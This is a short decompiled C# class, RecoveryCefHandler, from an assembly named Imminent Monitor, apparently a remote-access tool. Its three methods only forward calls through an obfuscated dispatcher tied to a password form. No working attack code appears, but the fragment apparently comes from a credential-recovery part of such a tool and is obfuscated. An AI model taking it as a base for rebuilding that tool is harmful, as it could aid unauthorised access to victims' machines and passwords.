// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.RecoveryCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

namespace ImminentMonitor.Cef
{
  public class RecoveryCefHandler
  {
    public FormPassword PasswordForm;

    public RecoveryCefHandler(FormPassword password) => this.PasswordForm = password;

    public void updateTitle()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "/2`TSPa.Q$", object_3);
    }

    public void save(object[] items)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) items
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "[k3c,Pa.Q$", object_3);
    }

    public void refresh()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "2B\\0HPa.Q$", object_3);
    }
  }
}
